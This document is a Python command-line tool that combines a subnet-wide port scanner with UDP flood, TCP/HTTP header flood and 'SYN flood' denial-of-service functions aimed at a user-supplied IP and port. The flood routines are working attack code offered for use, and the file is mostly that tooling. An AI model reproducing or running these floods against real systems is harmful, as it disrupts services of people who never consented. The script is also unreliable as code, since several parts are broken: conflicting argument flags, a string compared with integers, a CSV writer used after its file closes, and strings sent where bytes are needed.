#!/usr/bin/env python3

import argparse
import random
import socket
import sys
import time
import os
import csv
import sqlite3
import matplotlib.pyplot as plt


def local_port_scan():
    ip = socket.gethostbyname(socket.gethostname())
    network_port_scan(ip)
    export_to_pdf()


def external_port_scan():
    network = input("Enter network address: ")
    network_port_scan(network)
    export_to_pdf()


def network_port_scan(ip):
    network_prefix = ip.split(".")[0]

    if 192 <= network_prefix <= 223:
        network_address = (
                ip.split(".")[0] + "." + ip.split(".")[1] + "." + ip.split(".")[2] + "."
        )
        network_range = range(1, 255)
        for i in network_range:
            ip = network_address + str(i)
            port_scan(ip)
    elif 128 <= network_prefix <= 191:
        network_address = ip.split(".")[0] + "." + ip.split(".")[1] + "."
        network_range = range(1, 255)
        for i in network_range:
            for j in network_range:
                ip = network_address + str(i) + "." + str(j)
                port_scan(ip)
    elif 1 <= network_prefix <= 126:
        network_address = ip.split(".")[0] + "."
        network_range = range(1, 255)
        for i in network_range:
            for j in network_range:
                for k in network_range:
                    ip = network_address + str(i) + "." + str(j) + "." + str(k)
                    port_scan(ip)
    else:
        print("Network not detected")
        return


def port_scan(ip):
    print("Scanning " + ip)
    for port in range(1, 65535):
        if not os.path.exists('port_scan.csv'):
            with open('port_scan.csv', 'w') as csvfile:
                fieldnames = ['ip', 'port', 'status']
                writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
                writer.writeheader()
        conn = sqlite3.connect('port_scan.db')
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS port_scan
                        (ip text, port integer, status text)''')
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            result = sock.connect_ex((ip, port))
            if result == 0:
                print("Port " + str(port) + " is open")
                writer.writerow({'ip': ip, 'port': port, 'status': 'open'})
                c.execute("INSERT INTO port_scan VALUES (?, ?, ?)", (ip, port, 'open'))

            c.close()
            conn.commit()
            conn.close()

            sock.close()
        except KeyboardInterrupt:
            print("Keyboard interrupt")
            sys.exit()
        except socket.gaierror:
            print("Hostname could not be resolved")
            sys.exit()
        except socket.error:
            print("Couldn't connect to server")
            sys.exit()


def export_to_pdf():
    print("Exporting to pdf...")
    # use the csv file to create a pdf file with graph
    with open('port_scan.csv', 'r') as csvfile:
        reader = csv.DictReader(csvfile)
        ip = []
        port = []
        status = []
        for row in reader:
            ip.append(row['ip'])
            port.append(row['port'])
            status.append(row['status'])
        plt.plot(ip, port, label='open ports')
        plt.xlabel('ip')
        plt.ylabel('port')
        plt.title('Port scan')
        plt.legend()
        plt.savefig('port_scan.pdf')
        plt.show()


def udp_flood(ip, port, duration):
    timeout = time.time() + duration
    sent = 0
    while True:
        if time.time() > timeout:
            break
        else:
            pass
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(random.randbytes(1490), (ip, port))
        sent = sent + 1
        print("Sent %s packets to %s through port:%s" % (sent, ip, port))


def tcp_flood(ip, port, duration):
    timeout = time.time() + duration
    sent = 0
    while True:
        if time.time() > timeout:
            break
        else:
            pass
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        sock.send("GET /?%s HTTP/1.1\r\n" % random.randint(0, 2000))
        for x in range(0, 100):
            sock.send("X-a: %s\r\n" % random.randint(1, 5000))
        sock.send("\r\n")
        sent = sent + 1
        print("Sent %s packets to %s through port:%s" % (sent, ip, port))


def syn_flood(ip, port, duration):
    timeout = time.time() + duration
    sent = 0
    while True:
        if time.time() > timeout:
            break
        else:
            pass
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)
        result = sock.connect_ex((ip, port))
        if result == 0:
            print("Port " + str(port) + " is open")
        sock.close()
        sent = sent + 1
        print("Sent %s packets to %s through port:%s" % (sent, ip, port))


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-h", "--help", help="show this help message and exit")
    parser.add_argument("-l", "--local", help="scan local network", action="store_true")
    parser.add_argument("-e", "--external", help="scan external network", action="store_true")
    parser.add_argument("-s", "--specific", help="scan specific ip", action="store_true")
    parser.add_argument("-u", "--udp", help="udp flood", action="store_true")
    parser.add_argument("-t", "--tcp", help="tcp flood", action="store_true")
    parser.add_argument("-s", "--syn", help="syn flood", action="store_true")
    parser.add_argument("-i", "--ip", help="target ip")
    args = parser.parse_args()

    if args.help:
        parser.print_help()
        exit(0)

    if args.local:
        local_port_scan()
    elif args.external:
        external_port_scan()
    elif args.specific:
        ip = input("Enter ip address: ")
        port_scan(ip)
    elif args.udp:
        ip = input("Enter ip address: ")
        port = int(input("Enter port: "))
        duration = int(input("Enter duration: "))
        udp_flood(ip, port, duration)
    elif args.tcp:
        ip = input("Enter ip address: ")
        port = int(input("Enter port: "))
        duration = int(input("Enter duration: "))
        tcp_flood(ip, port, duration)
    elif args.syn:
        ip = input("Enter ip address: ")
        port = int(input("Enter port: "))
        duration = int(input("Enter duration: "))
        syn_flood(ip, port, duration)
    else:
        parser.print_help()
        exit(0)


if __name__ == "__main__":
    main()
